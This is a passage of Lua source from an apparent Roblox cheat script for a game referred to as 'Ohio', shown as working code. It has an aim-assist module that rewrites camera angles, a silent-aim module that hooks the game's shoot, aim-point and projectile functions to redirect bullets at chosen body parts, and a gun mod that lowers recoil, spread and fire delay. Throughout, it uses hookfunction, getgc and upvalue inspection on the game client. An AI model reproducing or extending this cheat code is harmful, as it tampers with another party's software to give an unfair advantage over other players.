										local ammoManager = aimAssistMod and aimAssistMod.ammoManager

										if ammoManager then
											ammoManager = (aimAssistMod.ammoManager.ammo or 0) > 0
										end

										if not ammoManager then
											return
										end
										local v30 = fn68()
										local v31 = fn70()
										local camera = Camera()
										if not (v30 and v31 and camera) then
											return
										end
										local cFrame = camera.CFrame
										local position = cFrame.Position
										local viewportSize = camera.ViewportSize
										local v32, v33 = fn113(camera)
										local v34 = fn114(camera, tbl30.AimAssist.Fov)
										local huge = Huge
										local useFov = tbl30.AimAssist.UseFov
										local range = tbl30.AimAssist.Range
										local predictionX = tbl30.AimAssist.PredictionX
										local predictionY = tbl30.AimAssist.PredictionY
										local n12 = Max(1, Min(viewportSize.X, viewportSize.Y) * 0.5)
										local n13 = nil
										local n14 = nil

										for i = 1, fn118() do
											local v35 = v26[7][v26[6] + i]
											local primaryPart = fn117(i) or v27[7][v27[6] + i]

											if (not primaryPart or not primaryPart.Parent) and v35 then
												primaryPart = v35.PrimaryPart
											end

											if primaryPart and primaryPart.Parent then
												local position2 = primaryPart.Position
												local v36 = LocalPlayer:DistanceFromCharacter(position2)

												if v36 <= range then
													local v37 = fn120(
														position2,
														primaryPart.Velocity or EmptyVector3,
														v36,
														predictionX,
														predictionY
													)

													local vector = PointToObjectSpace(cFrame, v37)
													local magnitude = vector.Magnitude

													if magnitude > 0.35 then
														local n15 = 1 / magnitude
														local n16 = vector.X * n15
														local n17 = vector.Y * n15
														local n18 = -vector.Z * n15

														if n18 > 0.02 then
															local v38, v39, v40, v41 = WorldToViewport(v37)

															if v40 > 0.05 then
																local n19 = v38 - v32
																local n20 = v39 - v33
																local n21 = Sqrt(n19 * n19 + n20 * n20)

																if not useFov or n21 <= v34 then
																	if not v41 then
																		n21 += 400
																	end

																	local n22 = (n21 / n12) ^ 2 * 1.55
																		+ (v36 / Max(1, range)) ^ 2 * 0.35

																	if
																		n22 < huge
																		and fn119(position, position2, v35, v30)
																	then
																		local toRad = ToRad
																		n13 = Atan2(n16, n18) / toRad
																		local toRad2 = ToRad
																		n14 = Atan2(n17, n18) / toRad2
																		huge = n22
																	end
																end
															end
														end
													end
												end
											end
										end

										if not n13 then
											return
										end
										aimAssistMod = aimAssistMod and aimAssistMod.aimAssistMod or 1
										local v35 = fn121()
										local v36 = fn123(tbl30.AimAssist.SpeedX * aimAssistMod, v35, arg2)
										local v37 = fn123(tbl30.AimAssist.SpeedY * aimAssistMod, v35, arg2)
										local n15 = ClientReplicator.Get(LocalPlayer, "xAngle") or 0

										local n16 = Clamp(
											(ClientReplicator.Get(LocalPlayer, "yAngle") or 0) + n14 * v37,
											-80,
											80
										)

										ClientReplicator.Set(LocalPlayer, "xAngle", (n15 - n13 * v36) % 360)
										ClientReplicator.Set(LocalPlayer, "yAngle", n16)
									end

									tbl30.AimAssist.Module = legit:CreateModule({
										Id = "ohio-aim-assist",
										Name = "AimAssist",
										Default = false,
										Callback = function(arg)
											if arg then
												hookfunction(
													require(
														ReplicatedStorage.devv.client.Objects.v3item.bin.Gun.modules.controller
													).aimAssist,
													fn124
												)

												fn116()
											elseif
												isfunctionhooked(
													require(
														ReplicatedStorage.devv.client.Objects.v3item.bin.Gun.modules.controller
													).aimAssist
												)
											then
												restorefunction(
													require(
														ReplicatedStorage.devv.client.Objects.v3item.bin.Gun.modules.controller
													).aimAssist
												)

												fn115()
											else
												fn115()
											end
										end,
									})

									tbl30.AimAssist.Module:CreateSelector({
										Id = "ohio-aim-assist-part",
										Name = "Part",
										Options = { { Value = "Head" }, { Value = "Body" } },
										Default = tbl30.AimAssist.Part,
										Callback = function(part)
											tbl30.AimAssist.Part = part
										end,
									})

									tbl30.AimAssist.Module:CreateSlider({
										Id = "ohio-aim-assist-x-speed",
										Name = "X Speed",
										Min = 0.1,
										Max = 5,
										Default = tbl30.AimAssist.SpeedX,
										Step = 0.1,
										Callback = function(speedX)
											tbl30.AimAssist.SpeedX = speedX
											SetAttribute(LocalPlayer, "aimAssistSensitivity", speedX)
										end,
									})

									tbl30.AimAssist.Module:CreateSlider({
										Id = "ohio-aim-assist-y-speed",
										Name = "Y Speed",
										Min = 0.1,
										Max = 5,
										Default = tbl30.AimAssist.SpeedY,
										Step = 0.1,
										Callback = function(speedY)
											tbl30.AimAssist.SpeedY = speedY
										end,
									})

									tbl30.AimAssist.Module:CreateSelector({
										Id = "ohio-aim-assist-animation",
										Name = "Animation",
										Options = {
											{ Value = "Linear" },
											{ Value = "Sine" },
											{ Value = "Quad" },
											{ Value = "Cubic" },
											{ Value = "Quart" },
											{ Value = "Quint" },
											{ Value = "Exponential" },
											{ Value = "Circular" },
											{ Value = "Back" },
											{ Value = "Bounce" },
											{ Value = "Elastic" },
										},
										Default = tbl30.AimAssist.Animation,
										Callback = function(animation)
											tbl30.AimAssist.Animation = animation
										end,
									})

									tbl30.AimAssist.Module:CreateSlider({
										Id = "ohio-aim-assist-prediction-x",
										Name = "Prediction X",
										Min = 0,
										Max = 7,
										Default = tbl30.AimAssist.PredictionX,
										Step = 0.1,
										Callback = function(predictionX)
											tbl30.AimAssist.PredictionX = predictionX
										end,
									})

									tbl30.AimAssist.Module:CreateSlider({
										Id = "ohio-aim-assist-prediction-y",
										Name = "Prediction Y",
										Min = 0,
										Max = 7,
										Default = tbl30.AimAssist.PredictionY,
										Step = 0.1,
										Callback = function(predictionY)
											tbl30.AimAssist.PredictionY = predictionY
										end,
									})

									tbl30.AimAssist.Module:CreateSlider({
										Id = "ohio-aim-assist-range",
										Name = "Range",
										Min = 50,
										Max = 2000,
										Default = tbl30.AimAssist.Range,
										Step = 1,
										Callback = function(range)
											tbl30.AimAssist.Range = range
										end,
									})

									local useFov = tbl30.AimAssist.Module:CreateToggle({
										Id = "ohio-aim-assist-use-fov",
										Name = "Use Fov",
										Default = tbl30.AimAssist.UseFov,
										Callback = function(useFov)
											tbl30.AimAssist.UseFov = useFov
										end,
									})

									tbl30.AimAssist.Module:CreateSlider({
										Id = "ohio-aim-assist-fov",
										Name = "Fov",
										Min = 1,
										Max = 300,
										Default = tbl30.AimAssist.Fov,
										Step = 1,
										Nested = true,
										Parent = useFov,
										Callback = function(fov)
											tbl30.AimAssist.Fov = fov
										end,
									})

									tbl30.AimAssist.Module:CreateColorPicker({
										Id = "ohio-aim-assist-fov-color",
										Name = "Color",
										Default = tbl30.AimAssist.FovColor,
										Nested = true,
										Parent = useFov,
										Callback = function(fovColor)
											tbl30.AimAssist.FovColor = fovColor
										end,
									})

									local function fn125()
										local tbl33 = {
											Head = { "Head" },
											Body = { "UpperTorso", "LowerTorso", "Torso", "HumanoidRootPart" },
											Arms = {
												"LeftUpperArm",
												"RightUpperArm",
												"LeftLowerArm",
												"RightLowerArm",
												"Left Arm",
												"Right Arm",
											},
											Legs = {
												"LeftUpperLeg",
												"RightUpperLeg",
												"LeftLowerLeg",
												"RightLowerLeg",
												"Left Leg",
												"Right Leg",
											},
										}

										local tbl34 = { Head = "Head", Body = "UpperTorso" }

										local tbl35 = {
											Head = NewVector3(1, 1, 1),
											Torso = NewVector3(2, 2, 1),
											UpperTorso = NewVector3(2, 2, 1),
											LowerTorso = NewVector3(2, 2, 1),
											HumanoidRootPart = NewVector3(2, 2, 1),
											["Left Arm"] = NewVector3(1, 2, 1),
											["Right Arm"] = NewVector3(1, 2, 1),
											LeftUpperArm = NewVector3(1, 2, 1),
											RightUpperArm = NewVector3(1, 2, 1),
											LeftLowerArm = NewVector3(1, 2, 1),
											RightLowerArm = NewVector3(1, 2, 1),
											["Left Leg"] = NewVector3(1, 2, 1),
											["Right Leg"] = NewVector3(1, 2, 1),
											LeftUpperLeg = NewVector3(1, 2, 1),
											RightUpperLeg = NewVector3(1, 2, 1),
											LeftLowerLeg = NewVector3(1, 2, 1),
											RightLowerLeg = NewVector3(1, 2, 1),
										}

										local n12 = 0.05
										local n13 = 24
										local v30 = nil

										local tbl36 = {
											Redirecting = false,
											Goal = nil,
											CachedPart = nil,
											ScanAccum = 0,
											ScanConn = nil,
											FovConn = nil,
											InnerShoot = nil,
											GetFn = nil,
											NewProjectileFn = nil,
											OldShoot = nil,
											OldGet = nil,
											OldNewProjectile = nil,
											Hooked = false,
											SelCount = 0,
											BestPart = nil,
											BestAngle = 360,
											PriPart = nil,
											PriAngle = 360,
											FovLastShow = false,
											FovLastX = 0,
											FovLastY = 0,
											FovLastDiam = 0,
										}

										local v31 = nil
										local v32 = nil
										local v33 = nil

										pcall(function()
											local hui = typeof(gethui) == "function" and gethui() or CoreGui
											local ScreenGui = NewInstance("ScreenGui")
											ScreenGui.Name = "\0"
											ScreenGui.IgnoreGuiInset = true
											ScreenGui.ResetOnSpawn = false
											ScreenGui.DisplayOrder = 11
											ScreenGui.Parent = hui
											local Frame = NewInstance("Frame")
											Frame.Name = "\0"
											Frame.BackgroundTransparency = 1
											Frame.AnchorPoint = NewVector2(0.5, 0.5)
											Frame.BorderSizePixel = 0
											Frame.Visible = false
											Frame.Parent = ScreenGui
											local UICorner = NewInstance("UICorner")
											UICorner.CornerRadius = NewUDim(1, 0)
											UICorner.Parent = Frame
											local UIStroke = NewInstance("UIStroke")
											UIStroke.Thickness = thickness
											UIStroke.Transparency = transparency
											UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
											UIStroke.Color = NewColor3(1, 1, 1)
											UIStroke.Parent = Frame
											v31 = ScreenGui
											v32 = Frame
											v33 = UIStroke
										end)

										local function fn126()
											local hitboxes = tbl30.SilentAim.Hitboxes
											local selCount = 0

											if hitboxes.Head then
												v30[7][v30[6] + 1] = "Head"
												selCount = 1
											end

											if hitboxes.Body then
												selCount += 1
												v30[7][v30[6] + selCount] = "Body"
											end

											if hitboxes.Arms then
												selCount += 1
												v30[7][v30[6] + selCount] = "Arms"
											end

											if hitboxes.Legs then
												selCount += 1
												v30[7][v30[6] + selCount] = "Legs"
											end

											tbl36.SelCount = selCount
											return selCount
										end

										local v34

										local function fn127(arg)
											local selCount = tbl36.SelCount
											if not arg or selCount < 1 then
												return 0
											end
											local n14 = 0

											for i = 1, selCount do
												local v35 = tbl33[v30[7][v30[6] + i]]

												if v35 then
													for i2 = 1, #v35 do
														local v36 = FindFirstChild(arg, v35[i2])

														if v36 and IsA(v36, "BasePart") then
															n14 += 1
															v34[7][v34[6] + n14] = v36
															if n13 <= n14 then
																return n14
															end
														end
													end
												end
											end

											return n14
										end

										local function fn128(arg, arg2)
											if not arg then
												return EmptyVector3
											end

											if not arg2 or arg2 <= 0 then
												return arg.Position
											end
											local n14 = arg2 / 200
											local vector = tbl35[arg.Name] or NewVector3(1, 2, 1)
											local position = arg.Position
											local newVector3 = NewVector3
											local x = vector.X
											local n15 = (Random() * 2 - 1) * x * n14
											local y = vector.Y
											local z = vector.Z

											return position
												+ newVector3(
													n15,
													(Random() * 2 - 1) * y * n14,
													(Random() * 2 - 1) * z * n14
												)
										end

										local function fn129(arg, arg2)
											local silentAim = tbl30.SilentAim
											local v35 = fn128(arg, silentAim.PointScale)
											local magnitude = LocalPlayer:DistanceFromCharacter(v35)

											if not magnitude or magnitude <= 0 then
												magnitude = (v35 - arg2).Magnitude
											end

											return fn120(
												v35,
												arg.AssemblyLinearVelocity or arg.Velocity or EmptyVector3,
												magnitude,
												silentAim.PredictionX,
												silentAim.PredictionY
											)
										end

										local function fn130(arg, arg2, arg3)
											if arg == LocalPlayer or not arg2 or not arg3 or arg3.Health <= 0 then
												return false
											end

											if FindFirstChildOfClass(arg2, "ForceField") or not CheckState(arg) then
												return false
											end

											if tbl30.SilentAim.IgnoreDowned and fn86(arg) then
												return false
											end
											return true
										end

										local function fn131(arg, arg2, arg3)
											if not arg then
												return false
											end

											if arg3 and arg.Name == arg3 then
												return true
											end

											return arg2 == "Body"
												and (
													arg.Name == "Torso"
													or arg.Name == "HumanoidRootPart"
													or arg.Name == "LowerTorso"
												)
										end

										local function fn132(arg, arg2, arg3, arg4, arg5)
											local character = arg.Character

											if
												not fn130(
													arg,
													character,
													character and FindFirstChildOfClass(character, "Humanoid")
												)
											then
												return
											end

											local humanoidRootPart = FindFirstChild(character, "HumanoidRootPart")

											if humanoidRootPart then
												local n14 = humanoidRootPart.Position - arg2

												if n14.Magnitude > 0.001 then
													if arg4 < Acos(Clamp(Dot(arg3, n14.Unit), -1, 1)) * 2 then
														return
													end
												end
											end

											local v35 = tbl36
											local priority = tbl30.SilentAim.Priority
											local v36 = tbl34[priority]

											for i = 1, fn127(character) do
												local v37 = v34[7][v34[6] + i]
												local n14 = v37.Position - arg2

												if n14.Magnitude >= 0.001 then
													local bestAngle = Acos(Clamp(Dot(arg3, n14.Unit), -1, 1)) * 2

													if bestAngle <= arg4 then
														local v38 = v36 and fn131(v37, priority, v36)

														if
															(
																bestAngle < v35.BestAngle
																or v38 and bestAngle < v35.PriAngle
															)
															and fn119(arg2, v37.Position, character, arg5)
														then
															if bestAngle < v35.BestAngle then
																v35.BestAngle = bestAngle
																v35.BestPart = v37
															end

															if v38 and bestAngle < v35.PriAngle then
																v35.PriAngle = bestAngle
																v35.PriPart = v37
															end
														end
													end
												end
											end
										end

										local function fn133()
											local camera = Camera()
											if not camera then
												return nil
											end

											if fn126() < 1 then
												return nil
											end
											local v35 = tbl36
											v35.BestPart = nil
											v35.BestAngle = 360
											v35.PriPart = nil
											v35.PriAngle = 360
											local position = camera.CFrame.Position
											local lookVector = camera.CFrame.LookVector
											local n14 = Rad(tbl30.SilentAim.Fov)
											local v36 = fn68()
											local players = GetPlayerList()

											for i = 1, #players do
												fn132(players[i], position, lookVector, n14, v36)
											end

											local silentAim = tbl30.SilentAim

											if
												tbl34[silentAim.Priority]
												and silentAim.Accuracy >= Random(1, 100)
												and v35.PriPart
											then
												return v35.PriPart
											end

											return v35.BestPart
										end

										local function fn134()
											local cachedPart = tbl36.CachedPart

											if not cachedPart or not cachedPart.Parent then
												cachedPart = fn133()
												tbl36.CachedPart = cachedPart
											end

											if not cachedPart then
												return nil
											end
											local position = Camera()
											position = position and position.CFrame.Position
											if typeof(position) ~= "Vector3" then
												return nil
											end
											return fn129(cachedPart, position)
										end

										local function fn135(arg)
											if type(arg) ~= "function" then
												return false
											end
											local v35 = debug.info(arg, "n")
											if v35 == "shootGunCheck" then
												return false
											end

											if v35 == "shoot" then
												return true
											end
											local str3 = tostring(debug.info(arg, "s") or "")
											local n14 = tonumber(debug.info(arg, "l")) or 0
											return str3:find("modules.shoot", 1, true) ~= nil and n14 > 0 and n14 < 100
										end

										local fn136 = nil

										fn136 = function(arg, arg2)
											if arg2 > 3 or type(arg) ~= "function" then
												return nil
											end
											local getupvalue_ = debug.getupvalue or getupvalue
											if type(getupvalue_) ~= "function" then
												return nil
											end

											for i = 1, 16 do
												local ok4, result4 = pcall(getupvalue_, arg, i)
												if not ok4 then
													break
												end

												if fn135(result4) then
													return result4
												end
											end

											for i = 1, 16 do
												local ok4, result4 = pcall(getupvalue_, arg, i)
												if not ok4 then
													break
												end

												if type(result4) ~= "function" then
													continue
												end
												local v35 = fn136(result4, arg2 + 1)
												if v35 then
													return v35
												end
											end

											return nil
										end

										local function fn137()
											if type(tbl36.InnerShoot) == "function" then
												return tbl36.InnerShoot
											end

											local ok4, innerShoot = pcall(
												require,
												ReplicatedStorage.devv.client.Objects.v3item.bin.Gun.modules.controller.modules.shoot
											)

											if ok4 and type(innerShoot) == "function" then
												if fn135(innerShoot) then
													tbl36.InnerShoot = innerShoot
													return innerShoot
												end
												local v35 = fn136(innerShoot, 0)
												if v35 then
													tbl36.InnerShoot = v35
													return v35
												end
											end

											if typeof(getgc) == "function" then
												for _, v35 in pairs(getgc(false)) do
													if fn135(v35) then
														tbl36.InnerShoot = v35
														return v35
													end
												end
											end

											return nil
										end

										local function fn138(arg)
											local goal = tbl36.Goal
											if type(arg) ~= "table" or typeof(goal) ~= "Vector3" then
												return
											end

											if typeof(arg.cframe) == "CFrame" then
												local position = arg.cframe.Position

												if (goal - position).Magnitude > 0.001 then
													arg.cframe = NewCFrame(position, goal)
												end
											end

											if typeof(arg.visualCFrame) == "CFrame" then
												local position = arg.visualCFrame.Position

												if (goal - position).Magnitude > 0.001 then
													arg.visualCFrame = NewCFrame(position, goal)
												end
											end
										end

										local function fn139(arg)
											if
												type(arg) == "function"
												and typeof(isfunctionhooked) == "function"
												and isfunctionhooked(arg)
											then
												pcall(restorefunction, arg)
											end
										end

										local function fn140(arg, arg2, ...)
											if tbl36.Redirecting and arg == LocalPlayer and arg2 == "aimPoint" then
												local goal = tbl36.Goal
												if typeof(goal) == "Vector3" then
													return goal
												end
											end

											local oldGet = tbl36.OldGet
											local v35 = table.pack(...)
											v35.n = 3 + v35.n - 1
											table.move(v35, 1, v35.n, 3, v35)
											v35[1] = arg
											v35[2] = arg2
											return oldGet(table.unpack(v35, 1, v35.n))
										end

										local function fn141(arg, arg2, ...)
											if tbl36.Redirecting then
												if type(arg) == "table" then
													fn138(arg)
												end

												if type(arg2) == "table" then
													fn138(arg2)
												end
											end

											local oldNewProjectile = tbl36.OldNewProjectile
											local v35 = table.pack(...)
											v35.n = 3 + v35.n - 1
											table.move(v35, 1, v35.n, 3, v35)
											v35[1] = arg
											v35[2] = arg2
											return oldNewProjectile(table.unpack(v35, 1, v35.n))
										end

										local function fn142(...)
											local silentAim = tbl30.SilentAim
											local flag4 = not silentAim.Enabled

											if not flag4 then
												local hitChance = silentAim.HitChance
												flag4 = Random(1, 100) > hitChance
											end

											if flag4 then
												return tbl36.OldShoot(...)
											end
											local v35 = fn134()
											if typeof(v35) ~= "Vector3" then
												return tbl36.OldShoot(...)
											end
											tbl36.Goal = v35
											tbl36.Redirecting = true
											local ok4, result4 = pcall(tbl36.OldShoot, ...)
											tbl36.Redirecting = false
											tbl36.Goal = nil

											if not ok4 then
												warn(result4)
											end
										end

										local function fn143(innerShoot, newProjectileFn)
											tbl36.InnerShoot = innerShoot
											tbl36.GetFn = ClientReplicator.Get
											tbl36.NewProjectileFn = newProjectileFn
											tbl36.OldGet = hookfunction(ClientReplicator.Get, fn140)

											if type(newProjectileFn) == "function" then
												tbl36.OldNewProjectile = hookfunction(newProjectileFn, fn141)
											end

											tbl36.OldShoot = hookfunction(innerShoot, fn142)
											tbl36.Hooked = true
										end

										local function fn144()
											if tbl36.FovConn then
												Disconnect(tbl36.FovConn)
												tbl36.FovConn = nil
											end

											if v32 and v32.Visible then
												v32.Visible = false
											end

											tbl36.FovLastShow = false
										end

										local function fn145()
											fn144()
											if not v32 or not v33 then
												return
											end

											local function fn146()
												local v35 = tbl36
												local silentAim = tbl30.SilentAim
												local camera = Camera()

												local fovLastShow = (
													silentAim.Module == nil or silentAim.Module:Get() == true
												)
													and silentAim.VisualizeFov == true
													and camera ~= nil

												if v35.FovLastShow ~= fovLastShow then
													v35.FovLastShow = fovLastShow
													v32.Visible = fovLastShow
												end

												if not fovLastShow then
													return
												end
												local v36, v37 = fn113(camera)

												local fovLastDiam =
													Max(2, Floor(fn114(camera, silentAim.Fov) * 2 + 0.5))

												if v33.Color ~= White then
													v33.Color = White
													v33.Transparency = transparency
												end

												if v35.FovLastX ~= v36 or v35.FovLastY ~= v37 then
													v35.FovLastX = v36
													v35.FovLastY = v37
													v32.Position = NewUDim2(0, v36, 0, v37)
												end

												if v35.FovLastDiam ~= fovLastDiam then
													v35.FovLastDiam = fovLastDiam
													v32.Size = NewUDim2(0, fovLastDiam, 0, fovLastDiam)
												end
											end

											fn146()
											tbl36.FovConn = Connect(RunService.RenderStepped, fn146)
										end

										local function fn146()
											if tbl36.ScanConn then
												Disconnect(tbl36.ScanConn)
												tbl36.ScanConn = nil
											end

											fn144()
											fn139(tbl36.InnerShoot)
											fn139(tbl36.GetFn)
											fn139(tbl36.NewProjectileFn)
											tbl36.Redirecting = false
											tbl36.Goal = nil
											tbl36.CachedPart = nil
											tbl36.ScanAccum = 0
											tbl36.OldShoot = nil
											tbl36.OldGet = nil
											tbl36.OldNewProjectile = nil
											tbl36.Hooked = false
											tbl30.SilentAim.Enabled = false
										end

										local function fn147()
											fn146()
											tbl30.SilentAim.Enabled = true
											local v35 = fn137()

											if not v35 then
												fn7("Silent Aim", "Failed to hook shoot", 4)
												tbl30.SilentAim.Enabled = false
												return
											end

											local projectiles = v3item.projectiles
											fn143(v35, projectiles and projectiles.newProjectileOfType)

											tbl36.ScanConn = Connect(RunService.Heartbeat, function(arg)
												if not tbl30.SilentAim.Enabled then
													fn146()
													return
												end
												tbl36.ScanAccum = tbl36.ScanAccum + arg
												if tbl36.ScanAccum < n12 then
													return
												end
												tbl36.ScanAccum = 0
												tbl36.CachedPart = fn133()
											end)

											if tbl30.SilentAim.VisualizeFov then
												fn145()
											end
										end

										tbl30.SilentAim.Module = legit:CreateModule({
											Id = "ohio-silent-aim",
											Name = "Silent Aim",
											Default = false,
											Callback = function(arg)
												if arg then
													fn147()
												else
													fn146()
												end
											end,
										})

										tbl30.SilentAim.Module:CreateSlider({
											Id = "ohio-silent-aim-fov",
											Name = "Maximum FOV",
											Min = 0,
											Max = 90,
											Default = tbl30.SilentAim.Fov,
											Step = 0.1,
											Callback = function(fov)
												tbl30.SilentAim.Fov = fov
											end,
										})

										tbl30.SilentAim.Module:CreateSlider({
											Id = "ohio-silent-aim-hit-chance",
											Name = "Hit Chance",
											Min = 0,
											Max = 100,
											Default = tbl30.SilentAim.HitChance,
											Step = 1,
											Callback = function(hitChance)
												tbl30.SilentAim.HitChance = hitChance
											end,
										})

										tbl30.SilentAim.Module:CreateSlider({
											Id = "ohio-silent-aim-accuracy",
											Name = "Accuracy",
											Min = 0,
											Max = 100,
											Default = tbl30.SilentAim.Accuracy,
											Step = 1,
											Callback = function(accuracy)
												tbl30.SilentAim.Accuracy = accuracy
											end,
										})

										tbl30.SilentAim.Module:CreateSlider({
											Id = "ohio-silent-aim-point-scale",
											Name = "Point Scale",
											Min = 0,
											Max = 100,
											Default = tbl30.SilentAim.PointScale,
											Step = 1,
											Callback = function(pointScale)
												tbl30.SilentAim.PointScale = pointScale
											end,
										})

										tbl30.SilentAim.Module:CreateSelector({
											Id = "ohio-silent-aim-priority",
											Name = "Hitscan Priority",
											Options = { { Value = "Closest" }, { Value = "Head" }, { Value = "Body" } },
											Default = tbl30.SilentAim.Priority,
											Callback = function(priority)
												tbl30.SilentAim.Priority = priority
											end,
										})

										tbl30.SilentAim.Module:CreateToggle({
											Id = "ohio-silent-aim-hitbox-head",
											Name = "Head",
											Default = tbl30.SilentAim.Hitboxes.Head,
											Callback = function(arg)
												tbl30.SilentAim.Hitboxes.Head = arg == true
											end,
										})

										tbl30.SilentAim.Module:CreateToggle({
											Id = "ohio-silent-aim-hitbox-body",
											Name = "Body",
											Default = tbl30.SilentAim.Hitboxes.Body,
											Callback = function(arg)
												tbl30.SilentAim.Hitboxes.Body = arg == true
											end,
										})

										tbl30.SilentAim.Module:CreateToggle({
											Id = "ohio-silent-aim-hitbox-arms",
											Name = "Arms",
											Default = tbl30.SilentAim.Hitboxes.Arms,
											Callback = function(arg)
												tbl30.SilentAim.Hitboxes.Arms = arg == true
											end,
										})

										tbl30.SilentAim.Module:CreateToggle({
											Id = "ohio-silent-aim-hitbox-legs",
											Name = "Legs",
											Default = tbl30.SilentAim.Hitboxes.Legs,
											Callback = function(arg)
												tbl30.SilentAim.Hitboxes.Legs = arg == true
											end,
										})

										tbl30.SilentAim.Module:CreateSlider({
											Id = "ohio-silent-aim-prediction-x",
											Name = "Prediction X",
											Min = 0,
											Max = 7,
											Default = tbl30.SilentAim.PredictionX,
											Step = 0.01,
											Callback = function(predictionX)
												tbl30.SilentAim.PredictionX = predictionX
											end,
										})

										tbl30.SilentAim.Module:CreateSlider({
											Id = "ohio-silent-aim-prediction-y",
											Name = "Prediction Y",
											Min = 0,
											Max = 7,
											Default = tbl30.SilentAim.PredictionY,
											Step = 0.01,
											Callback = function(predictionY)
												tbl30.SilentAim.PredictionY = predictionY
											end,
										})

										tbl30.SilentAim.Module:CreateToggle({
											Id = "ohio-silent-aim-visualize-fov",
											Name = "Visualize FOV",
											Default = tbl30.SilentAim.VisualizeFov,
											Callback = function(arg)
												tbl30.SilentAim.VisualizeFov = arg == true

												if tbl30.SilentAim.Enabled and arg then
													fn145()
												else
													fn144()
												end
											end,
										})

										tbl30.SilentAim.Module:CreateToggle({
											Id = "ohio-silent-aim-ignore-downed",
											Name = "Ignore Downed",
											Default = tbl30.SilentAim.IgnoreDowned,
											Callback = function(arg)
												tbl30.SilentAim.IgnoreDowned = arg == true
											end,
										})
									end

									fn125()
									local tbl33 = { "recoilAdd", "maxRecoil", "muzzleClimbFactor", "muzzleSwayFactor" }
									local tbl34 = { "horizRecoil", "vertRecoil", "recoilAngle" }
									local tbl35 = { "baseSpread", "baseAimSpread", "spread", "aimSpread" }
									local tbl36 = { "projectileLength" }
									local tbl37 = { "projectileLifetime" }
									local tbl38 = { "fireDebounce" }
									local tbl39 = {}
									local flag4 = false

									local function fn126(arg)
										return type(arg) == "table"
											and type(arg.name) == "string"
											and (
												type(arg.recoilAdd) == "number"
												or type(arg.spread) == "number"
												or type(arg.projectileLength) == "number"
												or type(arg.fireDebounce) == "number"
											)
									end

									local function fn127(arg)
										local name2 = arg and arg.name
										if type(name2) ~= "string" then
											return nil
										end

										if tbl39[name2] then
											return tbl39[name2]
										end
										local tbl40 = { keys = {}, fps = {} }

										for i = 1, #tbl33 do
											local v30 = tbl33[i]

											if type(arg[v30]) == "number" then
												tbl40.keys[v30] = arg[v30]
											end
										end

										for i = 1, #tbl35 do
											local v30 = tbl35[i]

											if type(arg[v30]) == "number" then
												tbl40.keys[v30] = arg[v30]
											end
										end

										for i = 1, #tbl36 do
											local v30 = tbl36[i]

											if type(arg[v30]) == "number" then
												tbl40.keys[v30] = arg[v30]
											end
										end

										for i = 1, #tbl37 do
											local v30 = tbl37[i]

											if type(arg[v30]) == "number" then
												tbl40.keys[v30] = arg[v30]
											end
										end

										for i = 1, #tbl38 do
											local v30 = tbl38[i]

											if type(arg[v30]) == "number" then
												tbl40.keys[v30] = arg[v30]
											end
										end

										local fpsOffsets = arg.FPSOffsets

										if type(fpsOffsets) == "table" then
											for i = 1, #tbl34 do
												local v30 = tbl34[i]

												if type(fpsOffsets[v30]) == "number" then
													tbl40.fps[v30] = fpsOffsets[v30]
												end
											end
										end

										tbl39[name2] = tbl40
										return tbl40
									end

									local function fn128()
										if flag4 then
											return
										end

										for _, v30 in pairs(tbl13) do
											if typeof(v30) == "Instance" then
												local ok4, result4 = pcall(require, v30)

												if ok4 and fn126(result4) then
													fn127(result4)
												end
											end
										end

										flag4 = true
									end

									local function fn129(arg, arg2, arg3, arg4, arg5, arg6)
										local v30 = fn127(arg)
										if not v30 then
											return
										end

										for i = 1, #tbl33 do
											local v31 = tbl33[i]

											if v30.keys[v31] ~= nil then
												arg[v31] = v30.keys[v31] * arg2
											end
										end

										for i = 1, #tbl35 do
											local v31 = tbl35[i]

											if v30.keys[v31] ~= nil then
												arg[v31] = v30.keys[v31] * arg3
											end
										end

										for i = 1, #tbl36 do
											local v31 = tbl36[i]

											if v30.keys[v31] ~= nil then
												arg[v31] = v30.keys[v31] * arg4
											end
										end

										for i = 1, #tbl37 do
											local v31 = tbl37[i]

											if v30.keys[v31] ~= nil then
												arg[v31] = v30.keys[v31] * arg5
											end
										end

										for i = 1, #tbl38 do
											local v31 = tbl38[i]

											if v30.keys[v31] ~= nil then
												arg[v31] = v30.keys[v31] * arg6
											end
										end

										local fpsOffsets = arg.FPSOffsets

										if type(fpsOffsets) == "table" then
											for i = 1, #tbl34 do
												local v31 = tbl34[i]

												if v30.fps[v31] ~= nil then
													fpsOffsets[v31] = v30.fps[v31] * arg2
												end
											end
										end
									end

									local function fn130(arg)
										local v30 = tbl39[arg.name]
										if not v30 then
											return
										end

										for k, key in pairs(v30.keys) do
											arg[k] = key
										end

										local fpsOffsets = arg.FPSOffsets

										if type(fpsOffsets) == "table" then
											for k, v31 in pairs(v30.fps) do
												fpsOffsets[k] = v31
											end
										end
									end

									local function fn131(arg)
										for _, v30 in pairs(tbl13) do
											if typeof(v30) == "Instance" then
												local ok4, result4 = pcall(require, v30)

												if ok4 and fn126(result4) then
													arg(result4)
												end
											end
										end

										local v30 = pairs
										local items = inventory.items or {}

										for _, item in v30(items) do
											if fn126(item) then
												arg(item)
											end
										end
									end

									local function fn132()
										fn128()
										if not tbl30.GunMod.Enabled then
											fn131(fn130)
											return
										end
										local n12 = tbl30.GunMod.Recoil / 100
										local n13 = tbl30.GunMod.Spread / 100
										local bulletSpeed = tbl30.GunMod.BulletSpeed
										local bulletLifetime = tbl30.GunMod.BulletLifetime
										local n14 = tbl30.GunMod.FireDebounce / 100

										fn131(function(arg)
											fn129(arg, n12, n13, bulletSpeed, bulletLifetime, n14)
										end)
									end

									fn93 = function()
										if tbl30.GunMod.Enabled then
											fn132()
										end
									end

									pcall(function()
										Connect(inventory.onItemAdded, function()
											if tbl30.GunMod.Enabled then
												fn132()
											end
										end)
									end)

									local gunMod = legit:CreateModule({
										Id = "ohio-gun-mod",
										Name = "Gun Mod",
										Default = false,
										Callback = function(arg)
											tbl30.GunMod.Enabled = arg == true
											fn132()
										end,
									})

									gunMod:CreateSlider({
										Id = "ohio-gun-mod-recoil",
										Name = "Recoil",
										Min = 0,
										Max = 100,
										Default = tbl30.GunMod.Recoil,
										Step = 1,
										Callback = function(recoil)
											tbl30.GunMod.Recoil = recoil

											if tbl30.GunMod.Enabled then
												fn132()
											end
										end,
									})

									gunMod:CreateSlider({
										Id = "ohio-gun-mod-spread",
										Name = "Spread",
										Min = 0,
										Max = 100,
										Default = tbl30.GunMod.Spread,
										Step = 1,
										Callback = function(spread)
											tbl30.GunMod.Spread = spread

